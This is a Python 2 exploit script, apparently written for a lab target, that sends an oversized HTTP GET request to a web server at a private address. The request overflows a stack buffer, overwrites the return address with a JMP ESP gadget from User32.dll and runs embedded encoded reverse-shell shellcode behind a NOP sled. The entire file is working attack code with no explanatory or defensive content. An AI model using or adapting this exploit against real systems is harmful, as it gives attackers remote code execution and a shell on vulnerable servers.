#!/usr/bin/python

import socket
import os
import sys
import struct

ip = "192.168.100.120"
port = 80

revshell =  b""
revshell += b"\xb8\x32\xd2\xd6\xbd\xdb\xca\xd9\x74\x24\xf4\x5b"
revshell += b"\x31\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\xd9"
revshell += b"\x2e\x34\x48\xe1\x27\x3b\xb3\x19\xb8\x5c\x3d\xfc"
revshell += b"\x89\x5c\x59\x75\xb9\x6c\x29\xdb\x36\x06\x7f\xcf"
revshell += b"\xcd\x6a\xa8\xe0\x66\xc0\x8e\xcf\x77\x79\xf2\x4e"
revshell += b"\xf4\x80\x27\xb0\xc5\x4a\x3a\xb1\x02\xb6\xb7\xe3"
revshell += b"\xdb\xbc\x6a\x13\x6f\x88\xb6\x98\x23\x1c\xbf\x7d"
revshell += b"\xf3\x1f\xee\xd0\x8f\x79\x30\xd3\x5c\xf2\x79\xcb"
revshell += b"\x81\x3f\x33\x60\x71\xcb\xc2\xa0\x4b\x34\x68\x8d"
revshell += b"\x63\xc7\x70\xca\x44\x38\x07\x22\xb7\xc5\x10\xf1"
revshell += b"\xc5\x11\x94\xe1\x6e\xd1\x0e\xcd\x8f\x36\xc8\x86"
revshell += b"\x9c\xf3\x9e\xc0\x80\x02\x72\x7b\xbc\x8f\x75\xab"
revshell += b"\x34\xcb\x51\x6f\x1c\x8f\xf8\x36\xf8\x7e\x04\x28"
revshell += b"\xa3\xdf\xa0\x23\x4e\x0b\xd9\x6e\x07\xf8\xd0\x90"
revshell += b"\xd7\x96\x63\xe3\xe5\x39\xd8\x6b\x46\xb1\xc6\x6c"
revshell += b"\xa9\xe8\xbf\xe2\x54\x13\xc0\x2b\x93\x47\x90\x43"
revshell += b"\x32\xe8\x7b\x93\xbb\x3d\x2b\xc3\x13\xee\x8c\xb3"
revshell += b"\xd3\x5e\x65\xd9\xdb\x81\x95\xe2\x31\xaa\x3c\x19"
revshell += b"\xd2\x15\x68\x45\x57\xfe\x6b\x85\x86\xa2\xe2\x63"
revshell += b"\xc2\x4a\xa3\x3c\x7b\xf2\xee\xb6\x1a\xfb\x24\xb3"
revshell += b"\x1d\x77\xcb\x44\xd3\x70\xa6\x56\x84\x70\xfd\x04"
revshell += b"\x03\x8e\x2b\x20\xcf\x1d\xb0\xb0\x86\x3d\x6f\xe7"
revshell += b"\xcf\xf0\x66\x6d\xe2\xab\xd0\x93\xff\x2a\x1a\x17"
revshell += b"\x24\x8f\xa5\x96\xa9\xab\x81\x88\x77\x33\x8e\xfc"
revshell += b"\x27\x62\x58\xaa\x81\xdc\x2a\x04\x58\xb2\xe4\xc0"
revshell += b"\x1d\xf8\x36\x96\x21\xd5\xc0\x76\x93\x80\x94\x89"
revshell += b"\x1c\x45\x11\xf2\x40\xf5\xde\x29\xc1\x15\x3d\xfb"
revshell += b"\x3c\xbe\x98\x6e\xfd\xa3\x1a\x45\xc2\xdd\x98\x6f"
revshell += b"\xbb\x19\x80\x1a\xbe\x66\x06\xf7\xb2\xf7\xe3\xf7"
revshell += b"\x61\xf7\x21"

crash  = "A" * 1786
crash += struct.pack("<I", 0x77414E5B) # Jmp ESP - User32.dll
crash += "\x90" * 30
crash += revshell
crash += "C" * (5000 - len(crash))

req  = "GET /" + crash + " HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Cookie: frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201; UserID=; PassWD=\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

